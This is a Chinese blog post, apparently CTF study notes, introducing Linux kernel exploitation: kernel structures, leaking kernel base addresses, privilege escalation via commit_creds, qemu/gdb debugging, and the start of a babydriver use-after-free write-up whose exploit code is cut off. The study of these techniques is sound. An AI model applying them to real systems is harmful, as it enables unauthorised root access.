<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  
    
      
    

    
  

  

  

  
    
      
    

    
  

  
    
    
    <link href="//fonts.googleapis.com/css?family=STZhongsong:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|consolas:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/014.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/014.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/014.jpg?v=5.1.4">






  <meta name="keywords" content="WP,summary,LinuxKernel,">










<meta name="description" content="前言：kernel算是glibc和virtual之间的过渡吧，想学好虚拟化，内核基础必须要扎实，所以这一部分花的时间也算挺长的。但收获也确实很大。记录下自己从零开始大概两周时间的学习内容。 pwn中kernel题的常规套路：给三个东西：start.sh，rootfs.cpio，bzImage。 用extract-vmlinux.sh脚本提取出vmlinux===&amp;gt; command: ./ex">
<meta name="keywords" content="WP,summary,LinuxKernel">
<meta property="og:type" content="article">
<meta property="og:title" content="LinuxKernel初识">
<meta property="og:url" content="http://yoursite.com/2020/04/20/LinuxKernel初识/index.html">
<meta property="og:site_name" content="xiaoxiaorenwu">
<meta property="og:description" content="前言：kernel算是glibc和virtual之间的过渡吧，想学好虚拟化，内核基础必须要扎实，所以这一部分花的时间也算挺长的。但收获也确实很大。记录下自己从零开始大概两周时间的学习内容。 pwn中kernel题的常规套路：给三个东西：start.sh，rootfs.cpio，bzImage。 用extract-vmlinux.sh脚本提取出vmlinux===&amp;gt; command: ./ex">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://i.loli.net/2020/02/11/WhMCLxYzGQV1Smt.png">
<meta property="og:image" content="https://i.loli.net/2020/02/08/tls1UomCfFW9AdI.png">
<meta property="og:image" content="https://i.loli.net/2020/02/13/YEdJjn95oa31Tpm.png">
<meta property="og:image" content="https://i.loli.net/2020/02/12/VG2IENot4lTvM7L.png">
<meta property="og:image" content="https://i.loli.net/2020/02/13/RW1KeXFnG3y2UBZ.png">
<meta property="og:image" content="https://i.loli.net/2020/02/13/7OfceoKrqnEWzgp.png">
<meta property="og:image" content="https://i.loli.net/2020/02/13/GAHEw85QxuI79CU.png">
<meta property="og:image" content="https://i.loli.net/2020/02/13/emLUsgqn79KupNS.png">
<meta property="og:image" content="https://i.loli.net/2020/02/14/9vPUIWgocpq4k3z.png">
<meta property="og:image" content="https://i.loli.net/2020/02/14/YvdOizhcMBPtLn7.png">
<meta property="og:image" content="https://i.loli.net/2020/02/14/HCFZt8DQAYueqX4.png">
<meta property="og:image" content="https://i.loli.net/2020/02/14/WPLIfZYQCuymdgt.png">
<meta property="og:image" content="https://i.loli.net/2020/02/14/IhpsxUXoEYHncMg.png">
<meta property="og:image" content="https://i.loli.net/2020/02/15/NHD8C4Jvx6UakPd.png">
<meta property="og:image" content="https://i.loli.net/2020/02/15/5IVaTP1u4CeqMZL.png">
<meta property="og:image" content="https://i.loli.net/2020/02/17/pBgsf1aYbh2xPVc.png">
<meta property="og:image" content="https://i.loli.net/2020/02/17/2RwiMIBSAPTsy1t.png">
<meta property="og:image" content="https://i.loli.net/2020/02/18/p4AvxNibrQOu5GC.png">
<meta property="og:image" content="https://i.loli.net/2020/02/19/JW3FOmgU4itZe8S.png">
<meta property="og:image" content="https://i.loli.net/2020/02/19/Q7WziS1NJmO3c6D.png">
<meta property="og:image" content="https://i.loli.net/2020/02/19/N5yojUfDZrFAB7c.png">
<meta property="og:image" content="https://i.loli.net/2020/02/19/i2wujlYHhvTgm8c.png">
<meta property="og:image" content="https://i.loli.net/2020/02/20/kp7IAKgEZyMqXv1.png">
<meta property="og:image" content="https://i.loli.net/2020/02/20/zycwq8tufCB3gU4.png">
<meta property="og:image" content="https://i.loli.net/2020/03/11/j3HLb862qRaiOSz.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/d7R1LSgPntaTkzr.png">
<meta property="og:image" content="https://i.loli.net/2020/03/11/jALe9w2IxKNbvs3.png">
<meta property="og:image" content="https://i.loli.net/2020/04/21/617PymFw4lkr2Bn.png">
<meta property="og:image" content="https://i.loli.net/2020/02/09/NabmUSIeAxZ6w9J.png">
<meta property="og:image" content="https://static.oschina.net/uploads/space/2018/0306/132701_6h0C_2896894.png">
<meta property="og:updated_time" content="2021-01-09T16:00:49.151Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="LinuxKernel初识">
<meta name="twitter:description" content="前言：kernel算是glibc和virtual之间的过渡吧，想学好虚拟化，内核基础必须要扎实，所以这一部分花的时间也算挺长的。但收获也确实很大。记录下自己从零开始大概两周时间的学习内容。 pwn中kernel题的常规套路：给三个东西：start.sh，rootfs.cpio，bzImage。 用extract-vmlinux.sh脚本提取出vmlinux===&amp;gt; command: ./ex">
<meta name="twitter:image" content="https://i.loli.net/2020/02/11/WhMCLxYzGQV1Smt.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","width":350,"display":"hide","offset":20,"b2t":true,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/04/20/LinuxKernel初识/">





  <title>LinuxKernel初识 | xiaoxiaorenwu</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta custom-logo">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">xiaoxiaorenwu</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">生活的艰辛，三分来自压力，七分来自攀比，我想做个小人物</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/20/LinuxKernel初识/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/xxrw.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xiaoxiaorenwu">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">LinuxKernel初识</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-20T23:00:00+08:00">
                2020-04-20
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/LinuxKernel学习/" itemprop="url" rel="index">
                    <span itemprop="name">LinuxKernel学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2020/04/20/LinuxKernel初识/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2020/04/20/LinuxKernel初识/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  35.5k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  191 min
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p><code>kernel</code>算是<code>glibc</code>和<code>virtual</code>之间的过渡吧，想学好虚拟化，内核基础必须要扎实，所以这一部分花的时间也算挺长的。但收获也确实很大。记录下自己从零开始大概两周时间的学习内容。</p>
<h1 id="pwn中kernel题的常规套路："><a href="#pwn中kernel题的常规套路：" class="headerlink" title="pwn中kernel题的常规套路："></a>pwn中kernel题的常规套路：</h1><p>给三个东西：<code>start.sh</code>，<code>rootfs.cpio</code>，<code>bzImage</code>。</p>
<p>用<code>extract-vmlinux.sh</code>脚本提取出<code>vmlinux</code>===&gt; <code>command</code>: <code>./extract-vmlinux.sh ./bzImage &gt; vmlinux</code>，需要注意的是这样提取出来的<code>vmlinux</code>是无符号表的，所以无法用<code>offset = hex(vmlinux.sym[&#39;func_name&#39;] - raw_vmlinux_base)</code>来寻找某个函数的相对偏移。</p>
<p><code>ropper</code>提取出<code>vmlinux</code>中的<code>gadgets</code> ===&gt; <code>command</code>: <code>ropper --file ./vmlinux --nocolor &gt; gadgets</code> 大约两分半可以跑完。 </p>
<p>然后解包<code>rootfs.cpio</code>后查看<code>init</code>文件一般会将漏洞模块加载到内核中去。我们把这个<code>ko</code>文件取出来放进<code>ida</code>逆向，寻找漏洞，之后调试也大部分是调试漏洞模块中的自定义函数。</p>
<p><strong>其实说白了，我个人觉得，<code>ko</code>文件就等同于是<code>glibcpwn</code>中的<code>binary</code>文件，<code>vmlinux</code>就等同于是<code>glibcpwn</code>中的<code>libc</code>。跟<code>glibcpwn</code>中的<code>binary</code>文件加载后的基址，<code>libc</code>加载后的基址一样，<code>ko</code>文件加载后的基址，<code>vmlinux</code>加载后的基址也同样非常地重要，也很容易理解。。。因为有了基址才有了一切<code>functions</code>和<code>gadgets</code>的地址，才可以劫持执行流。</strong></p>
<p><strong>所以。。。怎样泄露基址是一个关键点。</strong></p>
<h1 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h1><h2 id="对一些重要结构体和函数的理解："><a href="#对一些重要结构体和函数的理解：" class="headerlink" title="对一些重要结构体和函数的理解："></a>对一些重要结构体和函数的理解：</h2><h3 id="FOP-File-Operations-："><a href="#FOP-File-Operations-：" class="headerlink" title="FOP( File_Operations )："></a><code>FOP( File_Operations )</code>：</h3><p><strong>这个结构体和之后的函数是理解为什么我们在exp调用<code>open/close/read/write</code>这些系统调用时内核就会调用内核模块中的自定义函数的关键点。</strong></p>
<p>源码如下：<strong>不同版本的内核，结构与成员不同，需自己查阅</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	<span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*read_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*write_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">	<span class="keyword">int</span> (*iopoll)(struct kiocb *kiocb, <span class="keyword">bool</span> spin);</span><br><span class="line">	<span class="keyword">int</span> (*iterate) (struct file *, struct dir_context *);</span><br><span class="line">	<span class="keyword">int</span> (*iterate_shared) (struct file *, struct dir_context *);</span><br><span class="line">	<span class="keyword">__poll_t</span> (*poll) (struct file *, struct poll_table_struct *);</span><br><span class="line">	<span class="keyword">long</span> (*unlocked_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">	<span class="keyword">long</span> (*compat_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">	<span class="keyword">int</span> (*mmap) (struct file *, struct vm_area_struct *);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> mmap_supported_flags;</span><br><span class="line">	<span class="keyword">int</span> (*open) (struct inode *, struct file *);</span><br><span class="line">	<span class="keyword">int</span> (*flush) (struct file *, <span class="keyword">fl_owner_t</span> id);</span><br><span class="line">	<span class="keyword">int</span> (*release) (struct inode *, struct file *);</span><br><span class="line">	<span class="keyword">int</span> (*fsync) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">loff_t</span>, <span class="keyword">int</span> datasync);</span><br><span class="line">	<span class="keyword">int</span> (*fasync) (<span class="keyword">int</span>, struct file *, <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">int</span> (*lock) (struct file *, <span class="keyword">int</span>, struct file_lock *);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*sendpage) (struct file *, struct page *, <span class="keyword">int</span>, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *, <span class="keyword">int</span>);</span><br><span class="line">	<span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(struct file *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>)</span></span>;</span><br><span class="line">	<span class="keyword">int</span> (*check_flags)(<span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">int</span> (*flock) (struct file *, <span class="keyword">int</span>, struct file_lock *);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*splice_write)(struct pipe_inode_info *, struct file *, <span class="keyword">loff_t</span> *, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*splice_read)(struct file *, <span class="keyword">loff_t</span> *, struct pipe_inode_info *, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">int</span> (*setlease)(struct file *, <span class="keyword">long</span>, struct file_lock **, <span class="keyword">void</span> **);</span><br><span class="line">	<span class="keyword">long</span> (*fallocate)(struct file *file, <span class="keyword">int</span> mode, <span class="keyword">loff_t</span> offset,</span><br><span class="line">			  <span class="keyword">loff_t</span> len);</span><br><span class="line">	<span class="keyword">void</span> (*show_fdinfo)(struct seq_file *m, struct file *f);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">	<span class="keyword">unsigned</span> (*mmap_capabilities)(struct file *);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">ssize_t</span> (*copy_file_range)(struct file *, <span class="keyword">loff_t</span>, struct file *,</span><br><span class="line">			<span class="keyword">loff_t</span>, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">loff_t</span> (*remap_file_range)(struct file *file_in, <span class="keyword">loff_t</span> pos_in,</span><br><span class="line">				   struct file *file_out, <span class="keyword">loff_t</span> pos_out,</span><br><span class="line">				   <span class="keyword">loff_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> remap_flags);</span><br><span class="line">	<span class="keyword">int</span> (*fadvise)(struct file *, <span class="keyword">loff_t</span>, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>Linux使用<code>File_Operations</code>结构访问驱动程序的函数，这个结构的每一个成员的名字都对应着一个调用。</p>
<p>用户进程利用在对设备文件进行诸如<code>open/close/read/write</code>操作的时候，系统调用通过设备文件的主设备号找到相应的设备驱动程序，然后读取这个数据结构相应的函数指针，接着把控制权交给该函数，这是Linux的设备驱动程序工作的基本原理。</p>
<h3 id="proc-create创建文件："><a href="#proc-create创建文件：" class="headerlink" title="proc_create创建文件："></a><code>proc_create</code>创建文件：</h3><p><code>proc_create</code>函数会在<code>/proc</code>目录下创建一个虚拟文件，之后我们可用自定义的<code>fop</code>与其绑定，然后我们就可通过对这个虚拟文件的操作来调用自定义的内核模块函数了。<strong>等于打通了内核态和用户态的交互。</strong></p>
<p>比如说一个驱动程序在<code>init</code>中执行了<code>proc_create(&quot;core&quot;, 0x1B6LL, 0LL, &amp;core_fops)</code>，文件名是<code>core</code>，而且在<code>core_fops</code>中绑定了自定义的<code>ioctl</code>，那么其他用户程序就可以先<code>fopen</code>这个<code>core</code>获取文件指针<code>fd</code>，然后执行<code>ioctl(fd,&lt;参数&gt;,&lt;参数&gt;)</code>来进行对自定义<code>ioctl</code>的调用，其他的<code>fop</code>中的回调接口函数也类似。 </p>
<h3 id="kptr-restrict-与dmesg-restrict："><a href="#kptr-restrict-与dmesg-restrict：" class="headerlink" title="kptr_restrict 与dmesg_restrict："></a><code>kptr_restrict</code> 与<code>dmesg_restrict</code>：</h3><ul>
<li>在Linux内核漏洞利用中常常使用<code>commit_creds</code>和<code>prepare_kernel_cred</code>来完成提权（这两个函数可以存在于<code>vmlinux</code>中，可以类比于<code>libc</code>中的库函数）它们的地址可以从<code>/proc/kallsyms</code>中读取。将<code>/proc/sys/kernel/kptr_restrict</code>设置为<code>1</code>可阻止通过这种方式泄露内核地址。(默认就是设为<code>1</code>，只有<code>root</code>用户可查看)</li>
<li><code>dmesg</code>命令可以显示内核的环形缓冲区信息，<code>kprintf</code>打印的信息都可以用此命令查看，将<code>/proc/sys/kernel/dmesg_restrict</code>设为<code>1</code>可限制非<code>root</code>用户无法读<code>dmesg</code>（Restrict unprivileged access to kernel syslog）。 </li>
</ul>
<h3 id="关于基址："><a href="#关于基址：" class="headerlink" title="关于基址："></a>关于基址：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; vmlinux = ELF(<span class="string">"./vmlinux"</span>)</span><br><span class="line">[*] <span class="string">'/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli'</span></span><br><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0xffffffff81000000)</span><br><span class="line">RWX:      Has RWX segments</span><br><span class="line">&gt;&gt;&gt; hex(vmlinux.sym[<span class="string">'commit_creds'</span>] - 0xffffffff81000000)</span><br><span class="line"><span class="string">'0x9c8e0'</span></span><br></pre></td></tr></table></figure>
<p>几个量：</p>
<p><code>raw_vmlinux_base</code> ：<code>0xffffffff81000000</code>  ===&gt;  <code>vmlinux</code>静态文件中的基址，可直接查看。</p>
<p><code>func_offset</code>：<code>vmlinux.sym[&#39;func_name&#39;] - raw_vmlinux_base</code> ===&gt; <code>vmlinux</code>中<code>func</code>函数相对文件开头的偏移。这个<code>vmlinux</code>必须得有符号表，自己导出的不可。</p>
<p>动态运行时函数与基址的关系：<code>vmlinux_base</code> = <code>func_addr</code> - <code>func_offset</code></p>
<p><code>vmlinux_base</code>和<code>func_addr</code>需要通过漏洞来泄露其中一个，当然能直接看那就无所谓了orz。</p>
<h1 id="关于gdb-qemu调试："><a href="#关于gdb-qemu调试：" class="headerlink" title="关于gdb+qemu调试："></a>关于gdb+qemu调试：</h1><p>至于在文件系统里怎么写就不细说了，网上都找的到的。。。加个<code>-s</code>即可（<code>-gdb tcp::1234</code>的缩写）<code>-S</code>看习惯，是让qemu在最开始卡住。</p>
<h2 id="我自己的常规流程："><a href="#我自己的常规流程：" class="headerlink" title="我自己的常规流程："></a>我自己的常规流程：</h2><h3 id="qemu内："><a href="#qemu内：" class="headerlink" title="qemu内："></a>qemu内：</h3><ul>
<li>启动，这时是<code>root</code>用户</li>
<li>查看加载的<code>ko</code>模块的基址</li>
<li>切换到普通用户，假装什么都没发生</li>
</ul>
<h3 id="qemu外，gdb内："><a href="#qemu外，gdb内：" class="headerlink" title="qemu外，gdb内："></a>qemu外，gdb内：</h3><ul>
<li><code>gdb -q ./vmlinux</code></li>
<li><code>add-symbol-file ./xxxx/ko ko模块基址</code></li>
<li><code>b 模块函数</code></li>
<li><code>target remote localhost:1234/:1234</code></li>
<li><code>c</code></li>
</ul>
<h3 id="qemu内：-1"><a href="#qemu内：-1" class="headerlink" title="qemu内："></a>qemu内：</h3><ul>
<li>运行exp</li>
</ul>
<h3 id="qemu外，gdb内：-1"><a href="#qemu外，gdb内：-1" class="headerlink" title="qemu外，gdb内："></a>qemu外，gdb内：</h3><ul>
<li>会卡在之前断下的函数的入口，然后按自己想下断点的地方继续下断点调试。</li>
</ul>
<h2 id="确定ko模块基址："><a href="#确定ko模块基址：" class="headerlink" title="确定ko模块基址："></a>确定ko模块基址：</h2><p>就像我之前说的，<code>ko</code>文件就是<code>binary</code>文件，<code>vmlinux</code>就相当于<code>libc</code>文件。</p>
<p>所以知道<code>ko</code>文件在内核空间的地址是一件很重要的事情，没有这个地址的话我们将无法运行<code>add-symbols-file ./your_module.ko  0xffffffffxxxxxxxx</code>命令来加载模块的符号表，也就没法在模块自定义函数下断点，也就是没法调试。</p>
<p>查看这个地址有很多办法：</p>
<ul>
<li><code>cat /sys/module/your_module/sections/.text</code></li>
<li><code>cat /proc/modules</code></li>
<li><code>lsmod</code></li>
</ul>
<p>但是不幸的是都需要<code>root</code>权限才能查看。。。(<code>lsmod</code>非<code>root</code>情况下使用显示地址为全0。)</p>
<p>好在因为我们是在本地操作，所以我们可以先在文件系统的<code>init</code>文件里将<code>setuidgid 1000 /bin/sh</code>改为<code>setuidgid 0 /bin/sh</code>，就可以以<code>root</code>用户启动<code>qemu</code>，我们查看到<code>ko</code>基址之后再切换到普通用户即可，所有的用户的所有信息在<code>/etc/passwd</code>下都可看到，可自己查看，一般都有一个普通用户（<code>uid</code> = 1000），一个root用户（<code>uid</code> = 0）。我们在root用户时输入:<code>su - 普通用户的名字</code>即可切换到普通用户，之后就可以装作是以普通用户登录的一样来搞事情，测试<code>exp</code>等。。。</p>
<h1 id="2017CSICN-babydriver"><a href="#2017CSICN-babydriver" class="headerlink" title="2017CSICN_babydriver:"></a>2017CSICN_babydriver:</h1><p>还是以学习知识为主，做题为此要，基础扎实最重要。</p>
<p><code>init</code>里先注册了一个字符设备文件: <code>babydev</code>。</p>
<p>关于编写字符设备驱动一系列函数可参考：</p>
<p><a href="https://zhuanlan.zhihu.com/p/73974707" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/73974707</a></p>
<p><a href="https://www.jianshu.com/p/3c917de2925c" target="_blank" rel="noopener">https://www.jianshu.com/p/3c917de2925c</a></p>
<p><a href="https://www.jianshu.com/p/1a18267bc00e" target="_blank" rel="noopener">https://www.jianshu.com/p/1a18267bc00e</a></p>
<p><a href="https://www.jianshu.com/p/767f75efc495" target="_blank" rel="noopener">https://www.jianshu.com/p/767f75efc495</a></p>
<p><a href="https://blog.csdn.net/tanyjin/article/details/51705530" target="_blank" rel="noopener">https://blog.csdn.net/tanyjin/article/details/51705530</a></p>
<h2 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h2><p><code>UAF</code></p>
<h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 